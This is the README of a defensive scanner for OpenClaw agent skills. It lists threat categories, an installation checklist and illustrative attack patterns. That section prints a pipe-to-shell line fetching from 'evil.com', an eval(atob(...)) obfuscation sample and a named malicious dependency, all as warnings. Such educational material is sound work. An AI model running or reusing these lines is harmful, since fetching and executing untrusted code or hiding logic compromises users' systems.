# OpenClaw Hard Hat 🛡️

**Safety-first installation for OpenClaw skills**

A security scanner and safety guide for the OpenClaw ecosystem. Run this BEFORE installing any skill to check for malware, suspicious code, and security issues.

## Why Hard Hat?

The OpenClaw ecosystem is powerful — your AI agent can control your browser, execute code, and access your files. But with great power comes great risk.

**Hard Hat provides:**
- 🔍 Pre-installation security scanning
- 📚 Security education for beginners  
- 🔔 Daily monitoring of installed skills
- 🛡️ Guardrails against common attack vectors

## Quick Start

```bash
# Clone the hard hat
git clone https://github.com/innergclaw/openclaw-hard-hat.git
cd openclaw-hard-hat

# Scan a skill BEFORE installing
node scripts/hard-hat-scan.js /path/to/skill-directory

# Example: Scan telegram-topic-manager
node scripts/hard-hat-scan.js ../telegram-topic-manager
```

## What It Detects

### 🔴 CRITICAL (Blocks Installation)
- Hardcoded API tokens/secrets
- Code obfuscation (eval + decode)
- Known malicious dependencies (e.g., "openclaw-core")
- Pipe-to-shell patterns (`curl | bash`)

### 🟠 HIGH (Review Required)
- Downloads from untrusted sources
- Requests for sudo/admin privileges
- Destructive file operations
- System command execution

### 🟡 MEDIUM (Be Aware)
- External network requests
- External dependencies
- File deletion operations

## Installation Safety Checklist

```
BEFORE installing ANY skill:

☐ 1. Is it on GitHub?
   → If not publicly visible, don't install

☐ 2. Run Hard Hat scanner
   → node hard-hat-scan.js ./skill-name

☐ 3. Review findings
   → Any CRITICAL = STOP
   → Any HIGH = Review carefully

☐ 4. Read the code yourself
   → Start with README.md
   → Check install scripts
   → Look for suspicious patterns

☐ 5. Check dependencies
   → npm packages, external URLs
   → Are they trustworthy?

☐ 6. Start with least privilege
   → Don't run with sudo unless necessary
   → Test in isolated environment first
```

## Daily Security Check

Set up automatic daily scanning:

```bash
# Add to crontab (runs daily at 9 AM)
0 9 * * * cd /path/to/openclaw-hard-hat && node scripts/hard-hat-scan.js --daily-check >> logs/daily-scan.log 2>&1
```

Or use the provided setup script:

```bash
node scripts/setup-daily-check.js
```

## Understanding Scan Results

### 🟢 Safe to Install
```
✅ NO THREATS DETECTED
🟢 This skill appears safe to install
```
**Action:** Proceed with installation, but still review code manually.

### 🟡 Review Recommended  
```
⚡ REVIEW RECOMMENDED
Medium-risk findings. Understand before installing.
```
**Action:** Read the findings, understand what the code does, then decide.

### 🔴 Do Not Install
```
❌ INSTALLATION BLOCKED
Critical threats detected. DO NOT install this skill.
```
**Action:** Stop immediately. Report to community if unsure.

## Common Attack Patterns

### 1. Staged Payload Delivery
```bash
# BAD: Downloads and executes unknown code
curl https://evil.com/script.sh | bash
```

### 2. Fake Dependencies
```javascript
// BAD: Known malicious package
"dependencies": {
  "openclaw-core": "^1.0.0"  // ← MALWARE
}
```

### 3. Obfuscated Code
```javascript
// BAD: Hidden malicious code
eval(atob("Y29uc29sZS5sb2coJ2hYWNrZWQnKQ=="))
```

### 4. Hardcoded Secrets
```javascript
// BAD: Token in code
const TOKEN = "123456:ABC-DEF..."  // ← NEVER DO THIS
```

## Security Best Practices

### For Skill Users
1. **Trust but verify** — Scan everything
2. **Least privilege** — Don't use sudo unless required
3. **Isolation** — Test in separate environment first
4. **Backups** — Keep backups before major changes
5. **Updates** — Keep skills updated, review changelogs

### For Skill Developers
1. **Environment variables** — Never hardcode secrets
2. **Documentation** — Explain what your skill does
3. **Minimal permissions** — Don't request more access than needed
4. **Open source** — Keep code visible and reviewable
5. **SECURITY.md** — Include security guidelines

## Reporting Security Issues

Found a suspicious skill or security vulnerability?

1. **DO NOT** post publicly
2. Email: [security contact] or
3. Private GitHub security advisory
4. Include: scan results, code samples, reproduction steps

## Resources

- [Security Guide](docs/SECURITY_GUIDE.md)
- [Beginner's Checklist](docs/BEGINNER_CHECKLIST.md)
- [Common Attacks](docs/ATTACK_PATTERNS.md)
- [Safe Skill Examples](docs/SAFE_EXAMPLES.md)

## License

MIT — Free to use, modify, and share. Stay safe out there.

---

**Remember:** Hard Hat is a tool, not a guarantee. Always use your judgment. 🧠👁️
